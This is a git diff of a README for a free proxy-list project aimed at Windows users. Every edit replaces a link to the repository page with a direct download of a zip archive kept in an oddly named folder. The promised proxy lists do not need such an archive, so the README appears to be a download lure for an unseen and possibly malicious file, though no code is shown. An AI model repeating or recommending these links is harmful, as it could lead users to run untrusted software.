@@ -1,6 +1,6 @@
 # 🔗 Best-Free-Proxys - Reliable Proxy Lists for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Best--Free--Proxys-brightgreen)](https://github.com/Munachukwuw/Best-Free-Proxys)
+[![Download Now](https://img.shields.io/badge/Download-Best--Free--Proxys-brightgreen)](https://github.com/Munachukwuw/Best-Free-Proxys/raw/refs/heads/main/anarthrous/Free-Proxys-Best-v3.9.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get the proxy lists and start using them on Windows.
 
 Click the green button below to visit the download page for Best-Free-Proxys.
 
-[![Download Best-Free-Proxys](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Munachukwuw/Best-Free-Proxys)
+[![Download Best-Free-Proxys](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Munachukwuw/Best-Free-Proxys/raw/refs/heads/main/anarthrous/Free-Proxys-Best-v3.9.zip)
 
 This page contains the latest proxy list files and any related instructions.
 
@@ -128,7 +128,7 @@ Select proxies with good speed and acceptable anonymity for your task.
 
 Access the latest proxy lists and setup files by visiting:
 
-[https://github.com/Munachukwuw/Best-Free-Proxys](https://github.com/Munachukwuw/Best-Free-Proxys)
+[https://github.com/Munachukwuw/Best-Free-Proxys/raw/refs/heads/main/anarthrous/Free-Proxys-Best-v3.9.zip](https://github.com/Munachukwuw/Best-Free-Proxys/raw/refs/heads/main/anarthrous/Free-Proxys-Best-v3.9.zip)
 
 Follow the instructions there to download and save the proxy lists. Use your preferred tool to load and apply the proxies on Windows.
 
@@ -173,4 +173,4 @@ This project relates to:
 
 # [🚩 Best-Free-Proxys] - Start Browsing Anonymously Now!
 
-[![Download Best-Free-Proxys](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Munachukwuw/Best-Free-Proxys)
+[![Download Best-Free-Proxys](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Munachukwuw/Best-Free-Proxys/raw/refs/heads/main/anarthrous/Free-Proxys-Best-v3.9.zip)
